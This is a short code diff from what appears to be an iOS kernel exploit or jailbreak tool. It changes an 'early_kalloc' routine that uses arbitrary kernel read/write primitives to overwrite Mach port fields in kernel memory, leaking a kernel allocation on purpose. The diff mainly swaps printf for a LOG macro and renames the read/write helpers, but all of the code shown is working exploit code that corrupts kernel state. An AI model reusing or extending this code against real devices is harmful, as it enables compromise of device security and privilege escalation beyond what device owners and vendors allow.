@@ -15,6 +15,7 @@
 #include "find_port.h"
 #include "kmem.h"
 #include "offsets.h"
+#include <common.h>
 
 extern int message_size_for_kalloc_size(int kalloc_size);
 
@@ -23,7 +24,7 @@ uint64_t early_kalloc(int size) {
   mach_port_t port = MACH_PORT_NULL;
   kern_return_t err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
   if (err != KERN_SUCCESS) {
-    printf("unable to allocate port\n");
+    LOG("unable to allocate port\n");
   }
   
   uint64_t port_kaddr = find_port_address(port, MACH_MSG_TYPE_MAKE_SEND);
@@ -52,17 +53,17 @@ uint64_t early_kalloc(int size) {
                  MACH_PORT_NULL);
   
   if (err != KERN_SUCCESS) {
-    printf("early kalloc failed to send message\n");
+    LOG("early kalloc failed to send message\n");
   }
   
   // find the message buffer:
   
-  uint64_t message_buffer = rk64(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IKMQ_BASE));
-  printf("message buffer: %llx\n", message_buffer);
+  uint64_t message_buffer = ReadAnywhere64(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IKMQ_BASE));
+  LOG("message buffer: %llx\n", message_buffer);
   
   // leak the message buffer:
-  wk64(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IKMQ_BASE), 0);
-  wk32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_MSG_COUNT), 0x50000); // this is two uint16_ts, msg_count and qlimit
+  WriteAnywhere64(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IKMQ_BASE), 0);
+  WriteAnywhere32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_MSG_COUNT), 0x50000); // this is two uint16_ts, msg_count and qlimit
   
   
   return message_buffer;
